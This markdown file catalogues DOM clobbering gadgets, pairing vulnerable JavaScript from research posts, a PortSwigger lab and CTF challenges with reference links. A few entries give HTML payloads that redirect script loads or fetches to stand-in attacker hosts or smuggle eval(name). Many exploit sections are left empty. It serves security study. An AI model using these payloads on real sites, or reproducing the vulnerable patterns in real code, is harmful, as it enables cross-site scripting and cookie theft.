## Existing DOM Clobbering Gadgets

### AMP4Email

#### Reference
+ https://research.securitum.com/xss-in-amp4email-dom-clobbering/
+ https://blog.huli.tw/2021/01/23/en/dom-clobbering/

#### Vulnerable Code
```
<script>
  var script = window.document.createElement("script");
  script.async = false;

  var loc;
  if (AMP_MODE.test && window.testLocation) {
      loc = window.testLocation
  } else {
      loc = window.location;
  }

  if (AMP_MODE.localDev) {
      loc = loc.protocol + "//" + loc.host + "/dist"
  } else {
      loc = "https://cdn.ampproject.org";
  }

  var singlePass = AMP_MODE.singlePassType ? AMP_MODE.singlePassType + "/" : "";
  b.src = loc + "/rtv/" + AMP_MODE.rtvVersion; + "/" + singlePass + "v0/" + pluginName + ".js";

  document.head.appendChild(b);
</script>
```

#### Exploit
```
<a id="AMP_MODE" name="localDev"></a>
<a id="AMP_MODE" name="test"></a>

<a id="testLocation"></a>
<a id="testLocation" name="protocol" href="https://attack.com"></a>
```

### Fword CTF - Shisui Web

#### Reference
+ https://lebr0nli.github.io/blog/security/fwordCTF2021/#shisui-web
+ https://web.archive.org/web/20220524204523/https://blog.bi0s.in/2021/08/30/Web/Fword-CTF-2021-Shisui-Write-up/

#### Vulnerable Code
```
<script>
window.SETTINGS = window.SETTINGS || [{
  dataset:{
    "timezone":"",
    "location":"Tunisia"
  },
  Title:"FwordFeedbacks",
  check: false	
}]
function looseJsonParse(obj){
  if(obj.length<35){  
	return eval("(" + obj + ")");
  }else{
    return {location:"Limit Length Exceeded"}
  }
}
function addInfos(){
	if(window.showInfos && SETTINGS.check  && SETTINGS[0].dataset.timezone.length>2){
        var infos=`{location:${SETTINGS[0].dataset.location}}`;
	var result=document.createElement("p");
	result.textContent=`Location: ${looseJsonParse(infos).location} Timezone: UTC+1` ;
	document.getElementById("out").appendChild(result);
	console.log(result);
	}
}
addInfos()
</script>
```

#### Exploit
```
<a id=SETTINGS data-timezone=aaa data-location=eval(name)></a>
<a id=SETTINGS name=check></a>
<a id=showInfos></a>
```


### AmateursCTF 2023 Sanity

#### Reference
+ https://ctftime.org/writeup/37463

#### Vulnerable Code
```
<script>
  function loadBody() {
      let extension = null;
      if (window.debug?.extension) {
          let res = await fetch(window.debug?.extension.toString());
          extension = await res.json();
      }
  }
  loadBody();
</script>
```

#### Exploit
```
<a id="debug"></a><a id="debug" name="extension" href="//ATTACKER_SERVER"></a>
```

### Wizer CTF #14


#### Reference:
+ https://wizer-ctf.com/writeups/ctf14.html

#### Vulnerable Code
```
<script>
if(window.transferBalance && transferTo && pointsToTransfer) {
  var formData = JSON.stringify({"a": transferTo, "b": pointsToTransfer});
  const response = $.ajax({type: "POST", url: '../api/transferPoints', async: false,
    data: formData, success: function(){}, dataType: 'json',
    contentType : 'application/json'})
}
</script>
```

#### Exploit
```
<a id=transferBalance></a>
<a id=transferTo></a>
<a id=pointsToTransfer href="https://attack.com"></a>
```

### Notes CTF Challenge

#### Reference
+ https://github.com/aszx87410/ctf-writeups/issues/55

#### Vulnerable Code
```
<script>
function reloadRecaptchaScript(index) {
  // delay for a bit to not block main thread
  setTimeout(() => {
    console.log('reload', index, document.scripts[index])
    const element = document.scripts[index]
    const src = element.getAttribute('src')
    if (!src.startsWith('https://www.google.com/recaptcha/')) {
      throw new Error('reload failed, invalid src')
    }
    element.parentNode.removeChild(element)
    loadScript(src)
  }, 1000)
}
reloadRecaptchaScript();
</script>
```

#### Exploit
```
```


### ReCAPTCHA for the rescue

#### Reference
+ https://gist.github.com/terjanq/e2198440c4fdfbdec43e921b600d4a1d#recaptcha-for-the-rescue
+ https://ctftime.org/writeup/23580


#### Vulnerable Code
```
<script>
function writeOutput() {
  if (statusCode !== 3) {
    if (CONFIG.unsafeRender) {
      document.getElementById('output').innerHTML = output;
    } else {
      document.getElementById('output').innerText = output;
    }
  }
}
writeOutput();
</script>
```

#### Exploit
```
```



### Tamil CTF: Don't Only Mash... Clobber!

#### Reference
+ https://ctftime.org/writeup/32719

#### Vulnerable Code
```
<img id="user-image" src="https://devloper.com">
<script>
window.onload = () => {
    const imgSrc = document.getElementById('user-image').src
    document.getElementById('user-image-info').innerText = imgSrc

    if (DEBUG_MODE) {
        // In debug mode, send the image url to our debug endpoint for logging purposes.
        // We'd normally use fetch() but our CSP won't allow that so use an <img> instead.
        document.getElementById('body').insertAdjacentHTML('beforeend', `<img src="${DEBUG_LOGGING_URL}?auth=${btoa(document.cookie)}&image=${btoa(imgSrc)}">`)
    }
}
</script>
```
#### Exploit



### zer0pts CTF 2021: Simple Blog

#### Reference
+ https://ctftime.org/writeup/26317

#### Vulnerable Code
```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Simple Blog</title>
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; object-src 'none'; base-uri 'none'; script-src 'nonce-DZ5mzla/D4n5wZNlTB5qQwurzU4=' 'strict-dynamic'; require-trusted-types-for 'script'; trusted-types default">
    <link rel="stylesheet" href="/css/bootstrap-foo.min.css">
    <link rel="stylesheet" href="/css/style.css">
  </head>
  <body>
    <div class="container">
      <nav class="navbar navbar-expand-lg navbar-foo bg-foo">
        <a class="navbar-brand" href="/">Simple Blog</a>
        <ul class="navbar-nav mr-auto">
          <li class="nav-item"><a class="nav-link" href="/report.php">Report Vulnerability</a></li>
        </ul>
        <ul class="navbar-nav">
          <li class="nav-item"><a class="nav-link" href="/?theme=dark">Toggle theme</a></li>
        </ul>
      </nav>
    </div>
    <main class="container" id="main">
      <div class="spinner-border" id="loading">
        <span class="sr-only">Loading...</span>
      </div>
    </main>
    <script src="/js/trustedtypes.build.js" nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=" data-csp="require-trusted-types-for 'script'; trusted-types default"></script>
    <script nonce="DZ5mzla/D4n5wZNlTB5qQwurzU4=">
    // JSONP
    const jsonp = (url, callback) => {
      const s = document.createElement('script');

      if (callback) {
        s.src = `${url}?callback=${callback}`;
      } else {
        s.src = url;
      }

      document.body.appendChild(s);
    };

    // render articles
    const render = articles => {
      const main = document.getElementById('main');
      const loading = document.getElementById('loading');

      articles.sort((a, b) => a.id - b.id);
      for (const article of articles) {
        const elm = document.createElement('article');
        elm.classList.add('blog-post');

        const title = document.createElement('h2');
        title.innerHTML = article.title;
        elm.appendChild(title);

        const content = document.createElement('p');
        content.innerHTML = article.content;
        elm.appendChild(content);

        main.appendChild(elm);
      }

      loading.remove();
    };

    // initialize blog
    const init = () => {
      // try to register trusted types
      try {
        trustedTypes.createPolicy('default', {
          createHTML(url) {
            return url.replace(/[<>]/g, '');
          },
          createScriptURL(url) {
            if (url.includes('callback')) {
              throw new Error('custom callback is unimplemented');
            }

            return url;
          }
        });
      } catch {
        if (!trustedTypes.defaultPolicy) {
          throw new Error('failed to register default policy');
        }
      }

      // TODO: implement custom callback
      jsonp('/api.php', window.callback);
    };

    init();
    </script>
  </body>
</html>
```

#### Exploit
```
```


### PortSwigger DOM Clobbering Lab

#### Reference
+ https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering

#### Vulnerable Code
```
<div id="user-comments"></div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.15/purify.js" integrity="sha512-+KCRGoMI0uG0f/CXO0UCZqGSsCButa/ZCCtumbkr6Mz0uzjVygrJVdnPa1zPvSMHeQ03dBUXrFUBBnY2uCbrkw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
function escapeHTML(data) {
    return data.replace(/[<>'"]/g, function(c){
        return '&#' + c.charCodeAt(0) + ';';
    })
}

function displayComments(comments) {
    let userComments = document.getElementById("user-comments");

    for (let i = 0; i < comments.length; ++i)
    {
        comment = comments[i];
        let commentSection = document.createElement("section");
        commentSection.setAttribute("class", "comment");

        let firstPElement = document.createElement("p");

        let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
        let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';

        let divImgContainer = document.createElement("div");
        divImgContainer.innerHTML = avatarImgHTML

        if (comment.author) {
            if (comment.website) {
                let websiteElement = document.createElement("a");
                websiteElement.setAttribute("id", "author");
                websiteElement.setAttribute("href", comment.website);
                firstPElement.appendChild(websiteElement)
            }

            let newInnerHtml = firstPElement.innerHTML + DOMPurify.sanitize(comment.author)
            firstPElement.innerHTML = newInnerHtml
        }

        if (comment.date) {
            let dateObj = new Date(comment.date)
            let month = '' + (dateObj.getMonth() + 1);
            let day = '' + dateObj.getDate();
            let year = dateObj.getFullYear();

            if (month.length < 2)
                month = '0' + month;
            if (day.length < 2)
                day = '0' + day;

            dateStr = [day, month, year].join('-');

            let newInnerHtml = firstPElement.innerHTML + " | " + dateStr
            firstPElement.innerHTML = newInnerHtml
        }

        firstPElement.appendChild(divImgContainer);

        commentSection.appendChild(firstPElement);

        if (comment.body) {
            let commentBodyPElement = document.createElement("p");
            commentBodyPElement.innerHTML = DOMPurify.sanitize(comment.body);

            commentSection.appendChild(commentBodyPElement);
        }
        commentSection.appendChild(document.createElement("p"));

        userComments.appendChild(commentSection);
    }
}

comments = [
  {author: 'Alice', avatar: '', date: '2021-01-01', body: 'Hello World!', website: 'https://example.com'},
]

displayComments(comments)
</script>
```
#### Exploit
```
```



### PortSwigger DOM Clobbering Lab2

#### Reference
+ https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters

#### Vulnerable Code
```
<body></body>

<script>
(function (root, factory) {
  if (typeof define === 'function' && define.amd) {
    define('html-janitor', factory);
  } else if (typeof exports === 'object') {
    module.exports = factory();
  } else {
    root.HTMLJanitor = factory();
  }
}(this, function () {

  /**
   * @param {Object} config.tags Dictionary of allowed tags.
   * @param {boolean} config.keepNestedBlockElements Default false.
   */
  function HTMLJanitor(config) {

    var tagDefinitions = config['tags'];
    var tags = Object.keys(tagDefinitions);

    var validConfigValues = tags
      .map(function(k) { return typeof tagDefinitions[k]; })
      .every(function(type) { return type === 'object' || type === 'boolean' || type === 'function'; });

    if(!validConfigValues) {
      throw new Error("The configuration was invalid");
    }

    this.config = config;
  }

  var blockElementNames = ['P', 'LI', 'TD', 'TH', 'DIV', 'H1', 'H2', 'H3', 'H4', 'H5', 'H6', 'PRE'];
  function isBlockElement(node) {
    return blockElementNames.indexOf(node.nodeName) !== -1;
  }

  var inlineElementNames = ['A', 'B', 'STRONG', 'I', 'EM', 'SUB', 'SUP', 'U', 'STRIKE'];
  function isInlineElement(node) {
    return inlineElementNames.indexOf(node.nodeName) !== -1;
  }

  HTMLJanitor.prototype.clean = function (html) {
    const sandbox = document.implementation.createHTMLDocument('');
    const root = sandbox.createElement("div");
    root.innerHTML = html;

    this._sanitize(sandbox, root);

    return root.innerHTML;
  };

  HTMLJanitor.prototype._sanitize = function (document, parentNode) {
    var treeWalker = createTreeWalker(document, parentNode);
    var node = treeWalker.firstChild();

    if (!node) { return; }

    do {
      if (node.nodeType === Node.TEXT_NODE) {
        // If this text node is just whitespace and the previous or next element
        // sibling is a block element, remove it
        // N.B.: This heuristic could change. Very specific to a bug with
        // `contenteditable` in Firefox: http://jsbin.com/EyuKase/1/edit?js,output
        // FIXME: make this an option?
        if (node.data.trim() === ''
            && ((node.previousElementSibling && isBlockElement(node.previousElementSibling))
                 || (node.nextElementSibling && isBlockElement(node.nextElementSibling)))) {
          parentNode.removeChild(node);
          this._sanitize(document, parentNode);
          break;
        } else {
          continue;
        }
      }

      // Remove all comments
      if (node.nodeType === Node.COMMENT_NODE) {
        parentNode.removeChild(node);
        this._sanitize(document, parentNode);
        break;
      }

      var isInline = isInlineElement(node);
      var containsBlockElement;
      if (isInline) {
        containsBlockElement = Array.prototype.some.call(node.childNodes, isBlockElement);
      }

      // Block elements should not be nested (e.g. <li><p>...); if
      // they are, we want to unwrap the inner block element.
      var isNotTopContainer = !! parentNode.parentNode;
      var isNestedBlockElement =
            isBlockElement(parentNode) &&
            isBlockElement(node) &&
            isNotTopContainer;

      var nodeName = node.nodeName.toLowerCase();

      var allowedAttrs = getAllowedAttrs(this.config, nodeName, node);

      var isInvalid = isInline && containsBlockElement;

      // Drop tag entirely according to the whitelist *and* if the markup
      // is invalid.
      if (isInvalid || shouldRejectNode(node, allowedAttrs)
          || (!this.config.keepNestedBlockElements && isNestedBlockElement)) {
        // Do not keep the inner text of SCRIPT/STYLE elements.
        if (! (node.nodeName === 'SCRIPT' || node.nodeName === 'STYLE')) {
          while (node.childNodes.length > 0) {
            parentNode.insertBefore(node.childNodes[0], node);
          }
        }
        parentNode.removeChild(node);

        this._sanitize(document, parentNode);
        break;
      }

      // Sanitize attributes
      for (var a = 0; a < node.attributes.length; a += 1) {
        var attr = node.attributes[a];

        if (shouldRejectAttr(attr, allowedAttrs, node)) {
          node.removeAttribute(attr.name);
          // Shift the array to continue looping.
          a = a - 1;
        }
      }

      // Sanitize children
      this._sanitize(document, node);

    } while ((node = treeWalker.nextSibling()));
  };

  function createTreeWalker(document, node) {
    return document.createTreeWalker(node,
                                     NodeFilter.SHOW_TEXT | NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT,
                                     null, false);
  }

  function getAllowedAttrs(config, nodeName, node){
    if (typeof config.tags[nodeName] === 'function') {
      return config.tags[nodeName](node);
    } else {
      return config.tags[nodeName];
    }
  }

  function shouldRejectNode(node, allowedAttrs){
    if (typeof allowedAttrs === 'undefined') {
      return true;
    } else if (typeof allowedAttrs === 'boolean') {
      return !allowedAttrs;
    }

    return false;
  }

  function shouldRejectAttr(attr, allowedAttrs, node){
    var attrName = attr.name.toLowerCase();

    if (allowedAttrs === true){
      return false;
    } else if (typeof allowedAttrs[attrName] === 'function'){
      return !allowedAttrs[attrName](attr.value, node);
    } else if (typeof allowedAttrs[attrName] === 'undefined'){
      return true;
    } else if (allowedAttrs[attrName] === false) {
      return true;
    } else if (typeof allowedAttrs[attrName] === 'string') {
      return (allowedAttrs[attrName] !== attr.value);
    }

    return false;
  }

  return HTMLJanitor;

}));

let janitor = new HTMLJanitor({tags: {input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}}});
document.body.innerHTML = janitor.clean(INPUT);
</script>
```

#### Exploit
```
```


### Intigriti-2024-memo

#### Reference:
+ https://sec.stealthcopter.com/intigriti-july-2024-ctf-challenge-memo/

#### Vulnerable Code:
```
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Memo Sharing</title>
    <script
      integrity="sha256-bSjVkAbbcTI28KD1mUfs4dpQxuQ+V4WWUvdQWCI4iXw="
      src="./dompurify.js"
    ></script>
    <link rel="stylesheet" href="./style.css" />
  </head>
  <body>
    <div class="navbar">
      <h1>Memo Sharing</h1>
    </div>
    <div class="container">
      <div class="app-description">
        <h4>
          Welcome to Memo Sharing, your safe platform for sharing memos.<br />Just type your memo
          below and send it!
        </h4>
      </div>
      <form id="memoForm">
        <input type="text" id="memoContentInput" placeholder="Enter your memo here..." required />
        <button type="submit" id="submitMemoButton">Submit Memo</button>
      </form>
    </div>

    <div class="memos-display">
      <p id="displayMemo"></p>
    </div>

    <script integrity="sha256-C1icWYRx+IVzgDTZEphr2d/cs/v0sM76a7AX4LdalSo=">
      document.getElementById("memoForm").addEventListener("submit", (event) => {
        event.preventDefault();
        const memoContent = document.getElementById("memoContentInput").value;
        window.location.href = `${window.location.href.split("?")[0]}?memo=${encodeURIComponent(
          memoContent
        )}`;
      });

      const urlParams = new URLSearchParams(window.location.search);
      const sharedMemo = urlParams.get("memo");

      if (sharedMemo) {
        const displayElement = document.getElementById("displayMemo");
        //Don't worry about XSS, the CSP will protect us for now
        displayElement.innerHTML = sharedMemo;

        //if (origin === "http://localhost") isDevelopment = true;
        if (isDevelopment) {
          //Testing XSS sanitization for next release
          try {
            const sanitizedMemo = DOMPurify.sanitize(sharedMemo);
            displayElement.innerHTML = sanitizedMemo;
          } catch (error) {
            const loggerScript = document.createElement("script");
            loggerScript.src = "./logger.js";
            loggerScript.onload = () => logError(error);
            document.head.appendChild(loggerScript);
          }
        }
      }
    </script>
  </body>
</html>
```

### Clobbering the clobbered

#### Reference
+ https://readmedium.com/en/dom-clobbering-techniques-8443547ebe94

#### Vulnerable Code
```
window.CONFIG = window.CONFIG || {
  version: "v20190816",
  test: false,
  appName: "XSS Challenge",
}

function loadModule(moduleName) {
  const scriptSrc = new URL(location); // patched here
  let url = '';
  
  
  if (CONFIG.test && window.testPath) {
    url = window.testPath.protocol + '//' + window.testPath.host;
  } else {
    url = scriptSrc.origin;
  }
  url += `/xss/1/modules/${CONFIG.version}/${moduleName}.js`;
  const sc = document.createElement('script');
  sc.src = url;
  document.body.appendChild(sc);
}

loadModule('h1-magic');
loadModule('tracker');
```

#### Exploit
```
```


### Go Go XSS Gadgets

#### Reference
+ https://buer.haus/2024/02/23/go-go-xss-gadgets-chaining-a-dom-clobbering-exploit-in-the-wild/

#### Vulnerable Code
```
<script charset="utf-8" type="text/javascript">
      var script = document.createElement("script")
      script.type = "text/javascript";
      script.src = window.parent.mGlobals.nuanceLaunchJS; // get from global variables
      document.getElementsByTagName("head")[0].appendChild(script);
    </script>
```

#### Exploit
```
```


### WIZER CTF #21: MENU DETAILS

#### Reference
+ https://www.wizer-training.com/for-developers/wizer-ctf-21-menu-details

#### Vulnerable Code
```
<html>
<head>
<title> Dashboard </title>
<script src=https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.15/purify.js"></script>
</head>
<body>	
    <h1>Dashboard</h1>

    <p> <span id="name">Guest</span>, Welcome to the Dashboard
    <a href="logout">Logout</a>
    </p>
    <p> <a href="profile">Profile</a> <span id="profileComment"></span></p>
    <p> <a href="settings">Settings</a> <span id="settingsComment"></span></p>
    <p> <a href="points">Points</a> (<span id="points">0</span>)</p>
    <p> <a href="leaderboard">Leaderboard</a></p>
</body>
<script>
    const urlParams = new URLSearchParams(window.location.search);
    for (var [key, value] of urlParams) {
        if(document.getElementById(key)) {
            document.getElementById(key).innerText = `${value}`;
        } else if (window.debugMode) {
            document.write("unidentified keys <br/>");
            document.write(`${key} = ${value} <br/>`);
        } else {
            key = DOMPurify.sanitize(key);
            document.write(`<span style='color: red'>${key} not found in the document</span><br/>`);
        }
    }
</script>
</html>
```

#### Exploit
```
```

### PBCTF 2020 - Ikea Name Generator

#### Reference
+ https://w0y.at/writeup/2020/12/08/pbctf-2020-ikea-name-generator.html
+ https://blog.jimmyli.us/articles/2020-12/PerfectBlueCTF-WebExploitaiton

#### Vulnerable Code
```
function createFromObject(obj) {
  var el = document.createElement("span");

  for (var key in obj) {
    el[key] = obj[key]
  }

  return el
}

function generateName() {

  var default_config = {
    "style": "color: red;",
    "text": "Could not generate name"
  }

  var output = document.getElementById('output')
  var req = new XMLHttpRequest();

  req.open("POST", CONFIG.url);
  req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded")
  req.onreadystatechange = function () {

    if (req.readyState === XMLHttpRequest.DONE) {
      if (req.status === 200) {
        var obj = JSON.parse(req.responseText);
        var config = _.merge(default_config, obj)


        sandbox = document.createElement("iframe")
        sandbox.src = "/sandbox.php"
        var el = createFromObject({
          style: config.style,
          innerText: config.text
        })

        output.appendChild(sandbox)
        sandbox.onload = function () {
          sandbox.contentWindow.output.appendChild(el)
        }
      }
    }
  }

  req.send("name=" + CONFIG.name)
}

window.onload = function() {
  document.getElementById("button-submit").onclick = function() {
    window.location = "/?name=" + document.getElementById("input-name").value
  }

  generateName();
}
```

#### Exploit
```
<a id=CONFIG></a><a id=CONFIG name=url href='URL'>
```
